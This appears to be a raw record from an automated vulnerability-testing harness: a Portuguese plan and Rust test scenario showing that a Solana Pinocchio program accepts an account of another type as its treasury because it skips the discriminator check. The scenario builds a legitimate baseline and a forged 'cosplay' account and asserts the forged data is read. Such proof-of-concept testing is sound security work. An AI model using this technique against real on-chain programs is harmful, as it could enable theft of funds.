attempts.raw:
{
  "plan": "O programa `process` (Pinocchio) le a conta `treasury` por offsets fixos (8..40 authority, 40..48 balance, 48 is_active) sem validar discriminador. O baseline usa uma conta de tesouraria legitima com is_active=1 e deve ter sucesso. O ataque fornece uma conta de outro tipo (ex.: uma conta de configuracao com layout compativel nos offsets usados) como `treasury`, e o programa a aceita como tesouraria valida. O efeito medido e que a conta de outro tipo foi aceita (execucao Success) e que os dados lidos pelo programa correspondem aos campos da conta de outro tipo, nao aos de uma tesouraria legitima.",
  "scenario": "let treasury_legit = account(
    &env.program_id,
    &{
        let mut d = vec![0u8; 49];
        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);
        d[8..40].copy_from_slice(&[0x11u8; 32]);
        d[40..48].copy_from_slice(&1000u64.to_le_bytes());
        d[48] = 1;
        d
    },
    None,
);

let authority = wallet(1_000_000_000);

let ix = env.raw_ix(&[0u8], &[
    AccountMeta::new_readonly(treasury_legit_key, false),
    AccountMeta::new_readonly(authority_key, false),
]);

let contas = vec![
    (treasury_legit_key, treasury_legit),
    (authority_key, authority),
];

let r = env.baseline("uso legitimo: treasury valida com is_active=1", &ix, &contas);

let treasury_cosplay = account(
    &env.program_id,
    &{
        let mut d = vec![0u8; 49];
        d[0..8].copy_from_slice(&[0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11]);
        d[8..40].copy_from_slice(&[0x22u8; 32]);
        d[40..48].copy_from_slice(&9999u64.to_le_bytes());
        d[48] = 1;
        d
    },
    None,
);

let ix_attack = env.raw_ix(&[0u8], &[
    AccountMeta::new_readonly(treasury_cosplay_key, false),
    AccountMeta::new_readonly(authority_key, false),
]);

let contas_attack = vec![
    (treasury_cosplay_key, treasury_cosplay),
    (authority_key, authority),
];

let r_attack = env.attack("cosplay: conta de outro tipo aceita como treasury", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let data = after(&r_attack, &treasury_cosplay_key).data();
    let stored_authority = read_pubkey(data, 8);
    let balance = read_u64(data, 40);
    let is_active = data[48] != 0;
    env.effect(
        "conta de outro tipo foi aceita como treasury: authority/balance/is_active lidos de dados que nao pertencem a tesouraria",
        stored_authority == Pubkey::new_from_array([0x22u8; 32])
            && balance == 9999
            && is_active,
    );
}"
}

